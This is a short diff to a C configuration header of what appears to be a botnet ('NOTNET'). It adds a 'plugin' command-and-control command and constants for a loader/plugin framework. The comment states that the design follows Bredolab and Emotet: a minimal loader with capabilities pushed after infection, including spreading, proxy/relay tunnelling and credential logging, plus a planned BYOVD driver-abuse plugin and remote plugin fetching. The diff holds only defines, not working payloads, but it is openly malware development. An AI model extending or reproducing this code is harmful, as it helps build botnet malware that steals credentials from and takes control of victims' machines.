@@ -96,6 +96,7 @@
 #define CMD_CONFIG_SET       "config_set"
 #define CMD_PROXY            "proxy"
 #define CMD_RELAY            "relay"
+#define CMD_PLUGIN           "plugin"
 #define CMD_PING             "ping"
 #define CMD_PONG             "pong"
 
@@ -162,5 +163,20 @@
 #define RELAY_MAX_CONNS         32
 #define RELAY_HANDSHAKE_TIMEOUT 5000    /* ms: auth + target connect */
 #define RELAY_TUNNEL_TIMEOUT    120000  /* ms: tunnel idle timeout */
+
+/* ── Loader/Plugin Framework (#92) ─────────────────────── */
+/* The Bredolab/Emotet split: the core bot stays a minimal loader and
+ * capabilities are pushed post-infection, dispatched by name from the
+ * C2. v1 implements the built-in plugin registry — spread, proxy,
+ * relay, cred-log (and a planned byovd entry) are compile-time linked
+ * plugins managed via the `plugin` C2 command. PLUGIN_MAX_REGISTRY
+ * caps the fixed registry table; PLUGIN_NAME_MAX bounds dispatch
+ * names. PLUGIN_DEFAULT_ENABLED defaults the framework on; set
+ * plugin_enabled=0 (config or config_set) to disable it. Remote fetch
+ * of shared-object plugins (dlopen) is planned future work and must
+ * reuse the fail-closed payload_sha256 pinning pattern. */
+#define PLUGIN_MAX_REGISTRY     8
+#define PLUGIN_NAME_MAX         32
+#define PLUGIN_DEFAULT_ENABLED  1
 
 #endif /* NOTNET_CONFIG_H */
